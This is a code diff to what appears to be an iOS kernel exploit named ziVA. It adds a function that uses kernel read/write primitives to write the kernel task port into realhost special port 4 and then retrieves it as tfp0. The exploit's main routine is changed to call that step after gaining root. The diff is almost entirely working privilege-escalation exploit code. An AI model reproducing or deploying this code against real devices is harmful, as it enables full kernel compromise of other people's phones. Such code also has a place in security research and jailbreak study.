@@ -42,14 +42,11 @@ cleanup:
 
 
 // Cleans up IOKit resources.
-static
-kern_return_t cleanup_iokit() {
+void cleanup_iokit() {
 	
-	kern_return_t ret = KERN_SUCCESS;
 	kernel_read_cleanup();
 	apple_ave_pwn_cleanup();
 
-	return ret;	
 }
 
 
@@ -86,6 +83,48 @@ kern_return_t test_rw_and_get_root() {
 
 cleanup:
 	return ret;
+}
+
+// Thanks Siguza!
+kern_return_t set_tfp0 () {
+    
+    #define REALHOST_SPECIAL_4_OFF  0x30
+    #define TASK_ITK_SELF_OFF       0xd8
+    
+    kern_return_t ret = KERN_SUCCESS;
+
+    // At this point we have root but no kernel task yet.
+    int uid = setuid(0); // update host to host_priv
+
+    if(uid != 0) { // Failed
+        goto cleanup;
+    } else {
+        
+        uint64_t ktask = 0;
+        ret = rwx_read(OFFSET(kernel_task), &ktask, sizeof(ktask));
+        
+        if(ret == KERN_SUCCESS) {
+            
+            uint64_t kport = 0;
+            ret = rwx_read(ktask + TASK_ITK_SELF_OFF, &kport, sizeof(kport));
+
+            if(ret == KERN_SUCCESS) {
+
+                ret = rwx_write(OFFSET(realhost) + REALHOST_SPECIAL_4_OFF, &kport, sizeof(kport));
+                
+                if(ret == KERN_SUCCESS) {
+                    extern task_t tfp0;
+                    ret = host_get_special_port(mach_host_self(), HOST_LOCAL_NODE, 4, &tfp0);
+                    if(ret != KERN_SUCCESS) {
+                        printf("[ERROR]: host_get_special_port: %s\n", mach_error_string(ret));
+                    }
+                }
+            }
+        }
+    }
+
+cleanup:
+    return ret;
 }
 
 // Called by triple fetch
@@ -133,7 +172,7 @@ int ziva_go() {
 	} else {
         printf("[INFO]: We're still alive and the fake surface was used\n");
 	}
-
+    
 	ret = test_rw_and_get_root();
 	if (KERN_SUCCESS != ret)
 	{
@@ -141,9 +180,15 @@ int ziva_go() {
         return 0; // Fail
 	}
 
+    ret = set_tfp0();
+    if (ret != KERN_SUCCESS) {
+        printf("[ERROR]: failed setting task for pid (0)\n");
+    } else {
+        printf("[INFO]: sucessfully set task for pid to 0\n");
+    }
+
     // We're root now!
     printf("[INFO]: ziVA is now root\n");
-    
     
     return 1; // Success!
 }
